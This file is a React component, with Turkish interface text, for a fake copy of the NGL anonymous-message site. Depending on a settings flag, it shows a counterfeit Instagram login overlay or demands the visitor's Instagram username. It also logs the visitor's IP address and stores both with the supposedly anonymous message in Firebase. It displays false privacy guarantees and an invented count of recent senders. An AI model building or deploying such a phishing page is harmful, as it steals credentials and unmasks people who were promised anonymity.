import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { UserCircle2, Dices } from 'lucide-react';
import { useParams } from 'react-router-dom';
import { getSettings, saveMessage } from '../lib/firebase';
import FakeInstagramLogin from '../components/FakeInstagramLogin';

export default function Send() {
  // Steps: 'loading' | 'ig_login' | 'ig_prompt' | 'ig_gate' | 'message' | 'success'
  const [step, setStep] = useState('loading');
  const [captureMode, setCaptureMode] = useState('username');
  const [igUsername, setIgUsername] = useState('');
  const [message, setMessage] = useState('');
  const [ip, setIp] = useState('Unknown');
  const { username } = useParams();
  const targetUser = username || 'enguncel_taskopruyeni_itiraf';

  const prompts = [
    "Şu an birinden hoşlanıyor musun?",
    "Benim hakkımda ne düşünüyorsun?",
    "Bir sırrını paylaş! 🤫",
    "En son kimi öptün? 💋",
    "Cesaret mi doğruluk mu?",
    "En büyük korkun ne?",
    "Takip ettiğin en garip hesap kim?",
    "Benimle ilgili 3 kelime söyle"
  ];

  useEffect(() => {
    // Fetch settings to determine capture mode
    getSettings()
      .then(settings => {
        const mode = settings.captureMode || 'username';
        setCaptureMode(mode);

        if (mode === 'ig_login') {
          setStep('ig_gate');
        } else if (mode === 'username') {
          setStep('ig_prompt');
        } else {
          setStep('message');
        }
      })
      .catch(() => setStep('ig_prompt'));

    // Fetch IP
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => setIp(data.ip))
      .catch(() => setIp('Unknown'));
  }, []);

  const handleIgLoginSuccess = (capturedUsername) => {
    setIgUsername(capturedUsername);
    setStep('message');
  };

  const handleNextStep = () => {
    if (igUsername.trim().length > 0) {
      setStep('message');
    }
  };

  const handleDice = () => {
    const random = prompts[Math.floor(Math.random() * prompts.length)];
    setMessage(random);
  };

  const handleSend = async () => {
    if (message.trim().length === 0) return;

    try {
      await saveMessage({
        text: message,
        igUsername: igUsername || 'Atlandı',
        ip: ip
      });
      setStep('success');
    } catch (err) {
      console.error('Failed to send message:', err);
    }
  };

  const handleReset = async () => {
    try {
      const settings = await getSettings();
      const mode = settings.captureMode || 'username';
      setCaptureMode(mode);

      if (mode === 'ig_login') {
        setStep('ig_gate');
      } else if (mode === 'username') {
        setStep('ig_prompt');
      } else {
        setStep('message');
      }
    } catch {
      setStep('ig_prompt');
    }
    setMessage('');
    setIgUsername('');
  };

  // Fake IG Login (full screen overlay)
  if (step === 'ig_login') {
    return <FakeInstagramLogin onSuccess={handleIgLoginSuccess} ip={ip} />;
  }

  const renderStep = () => {
    if (step === 'loading') {
      return (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="ngl-card"
          style={{ padding: '40px', textAlign: 'center', background: 'white', borderRadius: '30px', width: '100%' }}
        >
          <div className="loading-spinner"></div>
        </motion.div>
      );
    }

    // Gate screen: "NGL'ye Instagram ile giriş yap"
    if (step === 'ig_gate') {
      return (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="ngl-card ig-gate-card"
        >
          <div className="ig-gate-header">
            <div className="ngl-logo-gate">NGL</div>
            <p className="gate-subtitle">anonim mesaj gönder</p>
          </div>

          <button className="ig-connect-btn" onClick={() => setStep('ig_login')}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
              <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
              <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
            </svg>
            Instagram ile giriş yap
          </button>

          <div className="gate-security">
            <span>🔒</span>
            <span>Mesaj göndermek için Instagram hesabınla doğrulama yap</span>
          </div>
        </motion.div>
      );
    }

    // Username prompt (original behavior)
    if (step === 'ig_prompt') {
      return (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="ngl-card ig-prompt-card"
        >
          <div className="ig-header">
            <span className="ig-icon">📸</span>
            <h3>instagram adresini doğrula</h3>
          </div>
          <p className="trust-note">
            mesaj gönderebilmek için instagram kullanıcı adını gir.
          </p>

          <div className="input-field-group">
            <span className="at-symbol">@</span>
            <input
              type="text"
              placeholder="instagram kullanıcı adın"
              value={igUsername}
              onChange={(e) => setIgUsername(e.target.value)}
              className="ig-input"
            />
          </div>

          <div className="security-guarantee">
            <div className="guarantee-item">
              <span className="shield">🛡️</span>
              <span>kullanıcı adın hiç kimse ile paylaşılmayacaktır.</span>
            </div>
            <div className="guarantee-item">
              <span className="lock">🔒</span>
              <span>tüm gizlilik sorumluluğu NGL'ye aittir.</span>
            </div>
          </div>

          <button
            className="ngl-button"
            onClick={handleNextStep}
            disabled={!igUsername.trim()}
          >
            Devam Et
          </button>
        </motion.div>
      );
    }

    // Message form
    if (step === 'message') {
      return (
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="ngl-card message-card"
        >
          <div className="card-header">
            <div className="avatar">
              <UserCircle2 size={44} color="#dbdbdb" strokeWidth={1.5} />
            </div>
            <div className="header-info">
              <span className="username">@{targetUser}</span>
              <span className="tagline">bana anonim olarak mesajlar gönder!</span>
            </div>
          </div>

          <div className="question-box">
            <textarea
              placeholder="bir şeyler yaz..."
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              maxLength={300}
            />
            <button className="pill-dice" onClick={handleDice}><Dices size={24} color="#FF1F7C" /></button>
          </div>

          <button
            className="ngl-button"
            onClick={handleSend}
            disabled={!message.trim()}
          >
            Gönder!
          </button>
        </motion.div>
      );
    }

    // Success
    if (step === 'success') {
      return (
        <AnimatePresence>
          <motion.div
            initial={{ scale: 0.8, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="ngl-card success-card"
          >
            <div className="success-icon-wrapper">
              <div className="check-ring">
                <div className="check-mark">✓</div>
              </div>
            </div>
            <h2>teşekkürler!</h2>
            <p className="success-sub">mesajın başarıyla iletildi!</p>

            <button className="ngl-button reset-btn" onClick={handleReset}>
              Bir mesaj daha gönder
            </button>
          </motion.div>
        </AnimatePresence>
      );
    }
  };

  return (
    <div className="ngl-container main-bg">
      <div className="ngl-wrapper">
        {renderStep()}

        {(step === 'message' || step === 'ig_prompt' || step === 'ig_gate') && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="footer-elements"
          >
            <div className="lock-indicator">
              <span>🔒</span> anonim mesaj gönder
            </div>

            <div className="story-count">
              👇 214 kişi az önce mesaj gönderdi 👇
            </div>

            <button className="ngl-button app-action">
              Sen de anonim mesaj gönder!
            </button>
          </motion.div>
        )}

        <footer className="page-footer">
          <a href="#">Terms</a>
          <a href="#">Privacy</a>
        </footer>
      </div>

      <style>{`
        .main-bg {
          background: linear-gradient(180deg, #FF1F7C 0%, #FF9B42 100%);
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          padding: 60px 24px;
        }
        .ngl-wrapper {
          width: 100%;
          max-width: 400px;
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .loading-spinner {
          width: 36px;
          height: 36px;
          border: 3px solid #f0f0f0;
          border-top-color: #FF1F7C;
          border-radius: 50%;
          animation: spin 0.7s linear infinite;
          margin: 0 auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* IG Gate Card */
        .ig-gate-card {
          padding: 40px 30px;
          text-align: center;
          margin-bottom: 24px;
          background: white;
          border-radius: 30px;
          box-shadow: 0 10px 40px rgba(0,0,0,0.1);
          width: 100%;
        }
        .ig-gate-header { margin-bottom: 30px; }
        .ngl-logo-gate {
          font-weight: 900;
          font-size: 3rem;
          font-style: italic;
          color: #000;
          margin-bottom: 4px;
        }
        .gate-subtitle {
          color: #666;
          font-weight: 600;
          font-size: 1rem;
        }
        .ig-connect-btn {
          width: 100%;
          padding: 16px 24px;
          border: none;
          border-radius: 14px;
          font-size: 1rem;
          font-weight: 700;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          color: white;
          background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
          transition: transform 0.15s, box-shadow 0.15s;
          margin-bottom: 20px;
        }
        .ig-connect-btn:hover {
          transform: translateY(-2px);
          box-shadow: 0 6px 20px rgba(220, 39, 67, 0.3);
        }
        .ig-connect-btn:active { transform: scale(0.98); }
        .gate-security {
          display: flex;
          align-items: center;
          gap: 8px;
          font-size: 0.8rem;
          color: #888;
          font-weight: 600;
          justify-content: center;
        }

        /* Message card */
        .message-card {
          padding: 24px;
          margin-bottom: 24px;
          background: white;
          border-radius: 30px;
          box-shadow: 0 10px 40px rgba(0,0,0,0.1);
          width: 100%;
        }
        .card-header {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 24px;
        }
        .avatar {
          width: 50px;
          height: 50px;
          background: #f7f7f7;
          border-radius: 50%;
          display: flex; align-items: center; justify-content: center;
        }
        .header-info { display: flex; flex-direction: column; align-items: flex-start; }
        .username { font-weight: 700; font-size: 1rem; color: #000; }
        .tagline { font-size: 0.95rem; color: #333; font-weight: 500; }

        .question-box {
          background: #fdfdfd;
          border-radius: 24px;
          padding: 20px;
          position: relative;
          min-height: 160px;
          display: flex;
          flex-direction: column;
          border: 1px solid #f0f0f0;
          margin-bottom: 20px;
        }

        textarea {
          width: 100%;
          height: 100px;
          border: none;
          background: transparent;
          outline: none;
          font-size: 1.3rem;
          font-weight: 700;
          color: #FF1F7C;
          resize: none;
          text-align: left;
        }
        textarea::placeholder { color: #ffc9e0; }

        .pill-dice {
          position: absolute;
          bottom: 12px;
          right: 12px;
          background: #f0f0f0;
          border: none;
          width: 44px;
          height: 44px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          transition: transform 0.1s;
        }
        .pill-dice:active { transform: scale(0.9); }

        /* IG Prompt */
        .ig-prompt-card {
          padding: 30px;
          text-align: center;
          margin-bottom: 24px;
          background: white;
          border-radius: 30px;
          box-shadow: 0 10px 40px rgba(0,0,0,0.1);
          width: 100%;
        }
        .ig-header {
          display: flex;
          flex-direction: column;
          align-items: center;
          gap: 10px;
          margin-bottom: 20px;
        }
        .ig-icon { font-size: 2.5rem; }
        .ig-header h3 { font-weight: 800; font-size: 1.2rem; text-transform: lowercase; color: #000; }
        .trust-note { color: #666; font-weight: 600; font-size: 0.9rem; margin-bottom: 25px; line-height: 1.4; }
        
        .input-field-group {
          background: #f5f5f5;
          border-radius: 20px;
          display: flex;
          align-items: center;
          padding: 0 20px;
          margin-bottom: 25px;
          border: 2px solid transparent;
          transition: border-color 0.2s;
        }
        .input-field-group:focus-within { border-color: #FF1F7C; }
        .at-symbol { font-weight: 800; color: #999; font-size: 1.2rem; }
        .ig-input {
          background: transparent;
          border: none;
          padding: 18px 10px;
          width: 100%;
          font-weight: 700;
          font-size: 1rem;
          outline: none;
          color: #333;
        }
        .ig-input::placeholder { color: #aaa; }

        .security-guarantee {
          background: #fafafa;
          border-radius: 20px;
          padding: 20px;
          margin-bottom: 25px;
          display: flex;
          flex-direction: column;
          gap: 12px;
          text-align: left;
        }
        .guarantee-item {
          display: flex;
          align-items: center;
          gap: 12px;
          font-size: 0.8rem;
          font-weight: 700;
          color: #444;
        }

        .success-card { 
          padding: 50px 30px; 
          margin-bottom: 24px; 
          text-align: center; 
          background: white; 
          border-radius: 30px; 
          width: 100%;
        }
        .success-icon-wrapper { margin-bottom: 20px; }
        .check-ring {
          width: 80px;
          height: 80px;
          border-radius: 50%;
          background: #2ecc71;
          display: flex;
          align-items: center;
          justify-content: center;
          margin: 0 auto;
        }
        .check-mark { color: white; font-size: 3rem; font-weight: 900; }
        .success-sub { color: #666; font-weight: 600; font-size: 1.1rem; margin-top: 10px; }
        .reset-btn { margin-top: 25px; background: #000; color: white; border-radius: 30px; padding: 16px; font-weight: 800; width: 100%; }

        .lock-indicator {
          color: white; font-size: 0.85rem; font-weight: 700;
          display: flex; align-items: center; gap: 6px; margin-bottom: 24px; justify-content: center;
        }
        .story-count { color: white; font-weight: 800; font-size: 1.05rem; margin-bottom: 16px; text-align: center; }
        .app-action { background: rgba(0, 0, 0, 0.8); font-size: 1.1rem; padding: 18px 20px; border-radius: 30px; font-weight: 800; width: 100%; }
        .page-footer { margin-top: 40px; display: flex; gap: 20px; color: rgba(255,255,255,0.7); font-weight: 600; font-size: 0.9rem; justify-content: center; width: 100%; }
        
        .footer-elements { width: 100%; }
      `}</style>
    </div>
  );
}
